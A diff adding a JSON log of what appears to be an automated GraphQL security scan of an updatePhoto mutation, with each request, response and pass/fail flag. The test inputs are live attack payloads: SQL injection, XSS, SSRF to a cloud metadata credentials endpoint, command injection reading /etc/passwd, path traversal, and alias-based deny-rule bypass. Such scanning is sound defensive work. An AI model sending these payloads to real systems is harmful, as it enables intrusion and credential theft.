@@ -1,0 +1,332 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"47\", input: {title: \"Sunset Over Lake\", url: \"https://example.com/photos/47.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/47.jpg\"}) {\n    id\n    title\n    url\n    thumbnailUrl\n    album {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.923,
+    "timestamp": "2025-10-05T18:25:41.940150Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "47",
+          "title": "Sunset Over Lake",
+          "url": "https://example.com/photos/47.jpg",
+          "thumbnailUrl": "https://example.com/photos/thumbs/47.jpg",
+          "album": {
+            "id": "1",
+            "title": "quidem molestiae enim"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"47\", input: {title: \"Nice Photo'); DROP TABLE users; --\", url: \"https://example.com/photos/47.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/47.jpg\"}) {\n    id\n    title\n    url\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.851,
+    "timestamp": "2025-10-05T18:25:44.296934Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "47",
+          "title": "Nice Photo'); DROP TABLE users; --",
+          "url": "https://example.com/photos/47.jpg"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"48\", input: {title: \"<script>alert('xss')</script>\", url: \"https://example.com/photos/48.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/48.jpg\"}) {\n    id\n    title\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.851,
+    "timestamp": "2025-10-05T18:25:47.777721Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "48",
+          "title": "<script>alert('xss')</script>",
+          "thumbnailUrl": "https://example.com/photos/thumbs/48.jpg"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"49\", input: {title: \"FetchMetadata\", url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", thumbnailUrl: \"http://127.0.0.1/admin\"}) {\n    id\n    url\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.201,
+    "timestamp": "2025-10-05T18:25:51.682036Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "49",
+          "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "thumbnailUrl": "http://127.0.0.1/admin"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"50\", input: {title: \"payload; cat /etc/passwd\", url: \"https://example.com/photos/50.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/50.jpg\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.809,
+    "timestamp": "2025-10-05T18:25:54.089034Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "50",
+          "title": "payload; cat /etc/passwd"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"51\", input: {title: \"PathTest\", url: \"https://example.com/photos/51.jpg\", thumbnailUrl: \"../../../../../etc/passwd\"}) {\n    id\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.838,
+    "timestamp": "2025-10-05T18:25:57.556057Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "51",
+          "thumbnailUrl": "../../../../../etc/passwd"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"52\", input: {title: \"<b>Breaking</b><img src=x onerror=\\\"alert('html')\\\">\", url: \"https://example.com/photos/52.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/52.jpg\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.806,
+    "timestamp": "2025-10-05T18:26:01.333712Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updatePhoto": {
+          "id": "52",
+          "title": "<b>Breaking</b><img src=x onerror=\"alert('html')\">"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePhoto(id: \"100\", input: {title: \"PolicyBypassTest\", url: \"https://example.org/photos/100.jpg\", thumbnailUrl: \"https://example.org/thumbs/100.jpg\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.778,
+        "timestamp": "2025-10-05T18:26:04.538380Z",
+        "response_body": {
+          "data": {
+            "updatePhoto": {
+              "id": "100",
+              "title": "PolicyBypassTest"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.838,
+        "timestamp": "2025-10-05T18:26:05.376420Z",
+        "response_body": {
+          "data": {
+            "bypassed": {
+              "id": "100",
+              "title": "PolicyBypassTestAlias"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T18:26:05.376508Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 1.123,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  bypassed: updatePhoto(id: \"100\", input: {title: \"PolicyBypassTestAlias\", url: \"https://example.org/photos/100.jpg\", thumbnailUrl: \"https://example.org/thumbs/100.jpg\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.882,
+        "timestamp": "2025-10-05T18:26:09.868506Z",
+        "response_body": {
+          "data": {
+            "updatePhoto": {
+              "id": "100",
+              "title": "PolicyBypassTest"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.864,
+        "timestamp": "2025-10-05T18:26:10.732353Z",
+        "response_body": {
+          "data": {
+            "bypassed": {
+              "id": "100",
+              "title": "PolicyBypassTestAlias"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T18:26:10.732468Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 1.41,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updatePhoto(name: \"Photo\") {\n    name\n    fields {\n      name\n      type {\n        name\n        kind\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.764,
+    "timestamp": "2025-10-05T18:26:15.620625Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updatePhoto\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updatePhoto(name: \"Photo\") {\n    name\n    fields {\n      name\n      description\n      type {\n        name\n        kind\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.039,
+    "timestamp": "2025-10-05T18:26:18.992777Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updatePhoto\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
